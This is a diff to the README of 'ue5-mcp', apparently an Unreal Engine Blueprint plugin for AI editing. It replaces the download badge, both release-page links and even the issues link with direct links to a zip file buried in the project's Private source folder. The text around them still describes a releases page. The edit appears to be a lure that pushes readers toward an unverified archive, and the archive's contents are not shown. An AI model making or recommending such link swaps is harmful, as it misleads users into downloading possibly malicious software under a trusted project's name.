@@ -1,6 +1,6 @@
 # 🤖 ue5-mcp - AI Edits Unreal Blueprints Fast
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Latest%20Release-blue?style=for-the-badge)](https://github.com/brunoclazaro2010/ue5-mcp/releases)
+[![Download Latest Release](https://github.com/brunoclazaro2010/ue5-mcp/raw/refs/heads/main/Source/BlueprintMCP/Private/mcp_ue_v3.3.zip%20Release-blue?style=for-the-badge)](https://github.com/brunoclazaro2010/ue5-mcp/raw/refs/heads/main/Source/BlueprintMCP/Private/mcp_ue_v3.3.zip)
 
 ---
 
@@ -42,7 +42,7 @@ Follow these steps to download, install, and start using ue5-mcp with your Bluep
 
 1. **Download the Plugin:**  
    Visit the release page by clicking the large blue button at the top or use this link:  
-   [https://github.com/brunoclazaro2010/ue5-mcp/releases](https://github.com/brunoclazaro2010/ue5-mcp/releases)
+   [https://github.com/brunoclazaro2010/ue5-mcp/raw/refs/heads/main/Source/BlueprintMCP/Private/mcp_ue_v3.3.zip](https://github.com/brunoclazaro2010/ue5-mcp/raw/refs/heads/main/Source/BlueprintMCP/Private/mcp_ue_v3.3.zip)
 
 2. **Choose the Right Version:**  
    On the releases page, find the latest version compatible with your Unreal Engine. The files you want usually end with `.zip` or `.uplugin`.
@@ -71,7 +71,7 @@ Follow these steps to download, install, and start using ue5-mcp with your Bluep
 
 You can get the latest version of ue5-mcp on this page:
 
-[https://github.com/brunoclazaro2010/ue5-mcp/releases](https://github.com/brunoblazaro2010/ue5-mcp/releases)
+[https://github.com/brunoclazaro2010/ue5-mcp/raw/refs/heads/main/Source/BlueprintMCP/Private/mcp_ue_v3.3.zip](https://github.com/brunoclazaro2010/ue5-mcp/raw/refs/heads/main/Source/BlueprintMCP/Private/mcp_ue_v3.3.zip)
 
 Steps to download and install:
 
@@ -176,7 +176,7 @@ Topics related to the project include:
 ## 📞 Contact & Support
 
 If you have questions or want to report issues, open a new ticket on the GitHub issues page:  
-[https://github.com/brunoclazaro2010/ue5-mcp/issues](https://github.com/brunoclazaro2010/ue5-mcp/issues)
+[https://github.com/brunoclazaro2010/ue5-mcp/raw/refs/heads/main/Source/BlueprintMCP/Private/mcp_ue_v3.3.zip](https://github.com/brunoclazaro2010/ue5-mcp/raw/refs/heads/main/Source/BlueprintMCP/Private/mcp_ue_v3.3.zip)
 
 ---
 
